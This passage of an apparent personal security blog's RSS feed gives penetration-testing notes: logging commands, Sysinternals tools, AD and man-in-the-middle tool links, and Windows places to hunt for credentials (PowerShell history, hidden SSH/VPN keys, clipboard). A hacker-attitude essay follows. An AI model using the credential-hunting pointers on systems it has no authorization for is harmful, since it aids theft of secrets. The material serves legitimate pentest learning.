&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	           Information-Gathering
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			       ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	           Vulnerability-Assessment
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              	 ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           	 ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               	 ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    		 Windows
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     		    Information-Gathering
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    		       ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    		    ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     WebApp-Pentesting
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Social-Engineering
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     .......
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Reporting
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 Results
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	     ...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;general-categories-for-note-taking-during-target-assessment&#34;&gt;
  General categories for note-taking during target assessment
  &lt;a href=&#34;#general-categories-for-note-taking-during-target-assessment&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Newly discovered information&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Take note of every newly discovered vulnerabilities, targets or points of access, IP addresses, usernames, passwords, source code, etc. that you identified and are related to the penetration testing engagement and process.&lt;/p&gt;&lt;/blockquote&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Ideas for further tests and processing&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;You are processing hundreds if not thousands of data stream during penetration testing. It&amp;rsquo;s good record ideas that may be fleeting in the moment and may forget about it later.&lt;/p&gt;&lt;/blockquote&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Scan results&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;With such a large amount of information in a short time, one can quickly feel overwhelmed. It is not easy at first to filter out the most critical pieces of information. So tracking details like this may come in handy.&lt;/p&gt;&lt;/blockquote&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Logging&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Logging is essential for both documentation and our protection. If third parties attack the company during our penetration test and damage occurs, we can prove that the damage did not result from our activities. Tools like &lt;code&gt;script&lt;/code&gt; and &lt;code&gt;date&lt;/code&gt; help us track executed commands during penetration testing in organized manner. like so:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;script 03-21-2021-0200pm-exploitation.log&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This will start a script logging and will save it in &lt;code&gt;03-21-2021-0200pm-exploitation.log&lt;/code&gt; file for later assessment. if you want to end recording type &lt;code&gt;exit&lt;/code&gt; on the command line.&lt;/p&gt;&lt;/blockquote&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Screenshots&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Screenshots serve as a momentary record and represent proof of results obtained that may not be possible to describe using words.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Under Windows, the &lt;a href=&#34;https://docs.microsoft.com/en-us/sysinternals&#34;&gt;SysInternals Tools suite&lt;/a&gt; is a set of portable Windows applications that can be used to administer Windows systems (for the most part without requiring installation). The tools can be either downloaded from the Microsoft website or by loading them directly from an internet-accessible file share by typing &lt;code&gt;\\live.sysinternals.com\tools&lt;/code&gt; into a Windows Explorer window.&lt;/p&gt;
&lt;p&gt;For example, we can run &lt;code&gt;procdump.exe&lt;/code&gt; directly without downloading it to disk like so:&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;powershell&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PS C:\Users\George&amp;gt; \\live.sysinternals.com\tools\procdump.exe -accepteula
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ProcDump v11.0 - Sysinternals &lt;span style=&#34;color:#66d9ef&#34;&gt;process&lt;/span&gt; dump utility
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Copyright (C) &lt;span style=&#34;color:#ae81ff&#34;&gt;2009&lt;/span&gt;-&lt;span style=&#34;color:#ae81ff&#34;&gt;2022&lt;/span&gt; Mark Russinovich and Andrew Richards
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sysinternals - www.sysinternals.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Monitors a &lt;span style=&#34;color:#66d9ef&#34;&gt;process&lt;/span&gt; and writes a dump file when the &lt;span style=&#34;color:#66d9ef&#34;&gt;process&lt;/span&gt; exceeds the
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;specified criteria or has an exception.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Capture Usage&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   procdump.exe [-mm] [-ma] [-mt] [-mp] [-mc &amp;lt;Mask&amp;gt;] [-md &amp;lt;Callback_DLL&amp;gt;] [-mk]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                [-n &amp;lt;Count&amp;gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                [-s &amp;lt;Seconds&amp;gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                [-c|-cl &amp;lt;CPU_Usage&amp;gt; [-u]]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                [-m|-ml &amp;lt;Commit_Usage&amp;gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                [-p|-pl &amp;lt;Counter&amp;gt; &amp;lt;Threshold&amp;gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                [-h]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                [-e [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] [-g] [-b] [-ld] [-ud] [-ct] [-et]]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                [-l]&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer&#34;&gt;Process Explorer&lt;/a&gt; is a part of the Sysinternals tool suite. This tool can show which handles and DLL processes are loaded when a program runs.&lt;/p&gt;

&lt;h4 id=&#34;windows-host-enumeration-general-data&#34;&gt;
  Windows host enumeration general data
  &lt;a href=&#34;#windows-host-enumeration-general-data&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;Failing to follow any guided structure while performing &lt;code&gt;enumeration&lt;/code&gt;, we will struggle to know if we have all the required information to reach our goal. It can be easy to write off a system as being completely patched and not vulnerable to any current &lt;a href=&#34;https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures&#34;&gt;CVEs&lt;/a&gt; or the latest &lt;code&gt;vulnerabilities&lt;/code&gt;. However, if you only focus on that aspect, it is easy to miss out on the many human configuration errors that could exist in the environment. This is why taking our time and gathering all of the information we can on a system or environment should be prioritized in terms of importance over simply exploiting a system.&lt;/p&gt;
&lt;p&gt;renaming all file extensions in a folder &lt;code&gt;find . -name &amp;quot;*.old&amp;quot; -exec rename -v &#39;s/\.old$/\.new/i&#39; {} \;&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&#34;powershell-tools-for-sysadminspentesters&#34;&gt;
  PowerShell tools for sysadmins/pentesters
  &lt;a href=&#34;#powershell-tools-for-sysadminspentesters&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.powershellgallery.com/packages/AdminToolbox/11.0.8&#34;&gt;AdminToolbox&lt;/a&gt; - collection of helpful modules that allow system administrators to perform any number of actions dealing with things like Active Directory, Exchange, Network management, file and storage issues, and more.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps&#34;&gt;ActiveDirectory&lt;/a&gt; - collection of local and remote administration tools for all things Active Directory. We can manage users, groups, permissions, and much more with it.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/BC-SECURITY/Empire/tree/master/empire/server/data/module_source/situational_awareness&#34;&gt;Empire/Situational Awareness&lt;/a&gt; - collection of PowerShell modules and scripts that can provide us with situational awareness on a host and the domain they are apart of. This project is being maintained by &lt;a href=&#34;https://github.com/BC-SECURITY&#34;&gt;BC Security&lt;/a&gt; as a part of their Empire Framework.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Kevin-Robertson/Inveigh&#34;&gt;Inveigh&lt;/a&gt; - a tool built to perform network spoofing and Man-in-the-middle attacks.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors&#34;&gt;Bloodhound / SharpHound&lt;/a&gt; -  allows us to visually map out an Active Directory Environment using graphical analysis tools and data collectors written in C# and PowerShell.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;useful-directories-to-look-for-under-windows&#34;&gt;
  Useful Directories to look for under Windows
  &lt;a href=&#34;#useful-directories-to-look-for-under-windows&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;Appdata\&lt;/code&gt; folder. many applications store their config and temp data here&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;User folder like &lt;code&gt;C:\Users\User&lt;/code&gt;. SSH, VPN keys and more may be stored here as hidden files.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Console history is a goldmine. esp with admin access&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;C:\Users\&amp;lt;USERNAME&amp;gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Get-Content (Get-PSReadlineOption).HistorySavePath&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;user clipboard may indicate at something. &lt;code&gt;Get-Clipboard&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Scheduled tasks.&lt;/p&gt;
&lt;p&gt;AD is designed to be backward-compatible, and many features are arguably not &amp;ldquo;secure by default&amp;rdquo;. AD is essentially a sizeable read-only database accessible to all users within the domain, regardless of their privilege level. A basic AD user account with no added privileges can enumerate most objects within AD&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/manifesto/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/manifesto/</guid>
      <description>&lt;h1 id=&#34;hacker-manifesto&#34;&gt;
  Hacker Manifesto
  &lt;a href=&#34;#hacker-manifesto&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Hackers solve problems and build things. he believes in freedom and mutual help.&lt;/li&gt;
&lt;li&gt;To be accepted as a hacker, you have to behave as though you have this kind of attitude yourself. and to behave as such, you have to really believe the attitude.&lt;/li&gt;
&lt;li&gt;Becoming the kind of person who believes these things is important for &lt;em&gt;me&lt;/em&gt; - to help me keep learning and stay motivated.&lt;/li&gt;
&lt;li&gt;As with every other creative art, the most effective way to become a master is to &lt;em&gt;imitate the mindset of masters&lt;/em&gt; - not just intellectually but emotionally as well.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;if you really want to become a hacker, repeat these steps until you believe them:&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;hacker-manifesto&#34;&gt;
  Hacker Manifesto
  &lt;a href=&#34;#hacker-manifesto&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Hackers solve problems and build things. he believes in freedom and mutual help.&lt;/li&gt;
&lt;li&gt;To be accepted as a hacker, you have to behave as though you have this kind of attitude yourself. and to behave as such, you have to really believe the attitude.&lt;/li&gt;
&lt;li&gt;Becoming the kind of person who believes these things is important for &lt;em&gt;me&lt;/em&gt; - to help me keep learning and stay motivated.&lt;/li&gt;
&lt;li&gt;As with every other creative art, the most effective way to become a master is to &lt;em&gt;imitate the mindset of masters&lt;/em&gt; - not just intellectually but emotionally as well.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;if you really want to become a hacker, repeat these steps until you believe them:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;The world is full of fascinating problems waiting to be solved.&lt;/strong&gt;
To be a hacker you have to get a thrill from solving problems, sharpening your mind and skills and intelligence.
I&amp;rsquo;ll need to become this kind of person to make it as a hacker.
Also I need to develop faith in my own learning capacity. Realize that if I tackle problem piece by piece, even when I don&amp;rsquo;t know enough, I&amp;rsquo;ll learn enough to solve the next piece - and so on, until I&amp;rsquo;m done.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;No problem should ever be solved twice.&lt;/strong&gt;
Creative brain is a valuable, limited resource. They shouldn&amp;rsquo;t be wasted on reinventing the wheel when there are so many new fascinating problems out there.
To behave like a hacker, realize that the thinking time of other hackers is precious - so much so that it&amp;rsquo;s almost a moral duty to share information, solve problems and give the solutions away so other hackers can solve new problems instead of having to perpetually readdress old ones.
You do not necessarily have to share away all your discoveries and creative products, though hackers that do are the ones that get most respect from other hackers. Give away and sell enough to keep you in food and rent and computer in life. It&amp;rsquo;s more than fine to use your hacking skills to support a family or even get rich as long as you don&amp;rsquo;t forget your loyalty to your art and your fellow hackers while doing it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Boredom and mindlessness are evil.&lt;/strong&gt;
Hackers and creative people in general should never be bored or have to do stupid, repetitive work, because when this happens this means they aren&amp;rsquo;t doing what only they can do - solve new problems. This is waste of potential and creative energy.
To behave like a hacker, believe this - you want to automate the boring bits as much as possible, not just for yourself, but for everybody else(esp. for other hackers.)
&lt;em&gt;nobody who can think should ever be forced into a situation that bores them.&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Freedom is good.&lt;/strong&gt;
Hackers are by nature anti-authoritarian. Anyone who can give you orders can stop you from solving whatever problem you&amp;rsquo;re fascinated by - and given the way authoritarian minds work, will generally find some appallingly stupid reason to do so. So the authoritarian attitude has to be fought wherever you find it, lest it restrict me or other hackers.
This isn&amp;rsquo;t the same as fighting all authority. Children need to be guided and criminals restrained. A hacker may agree to accept some kinds of authority in order to get something he wants more than the time he spends following orders. But that&amp;rsquo;s a limited, conscious bargain; the kind of personal surrender authoritarians want is not on offer.
Authoritarians thrive on censorship and secrecy. And they distrust voluntary cooperation and information-sharing  they only like cooperation that they control. So to behave like a hacker, you have to develop an instinctive hostility to censorship, secrecy, and the use of force or deception to compel responsible adults. And you have to be willing to act on that belief&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Attitude is not substitute for competence.&lt;/strong&gt;
To be a hacker, develop some of these attitudes. But beware, copying an attitude won&amp;rsquo;t make you a hacker alone. any more that it will make you a champion athlete or a rock star. Becoming a hacker will take intelligence, practice, dedication, and hard work.
Learn to distrust attitude and respect competence of every kind. Hackers don&amp;rsquo;t let posers waste their time, but they worship competence - especially competence at hacking, but competence at anything is valued. Competence at demanding skill that few can master is esp. good, and competence at demanding skills that involve mental acuteness, craft and concentration is best.
Respect competence, and you&amp;rsquo;ll enjoy developing it in yourself - the hard work and dedication will become kind of intense play rather than routine. This attitude is vital to becoming a hacker.&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
  </channel>
</rss>
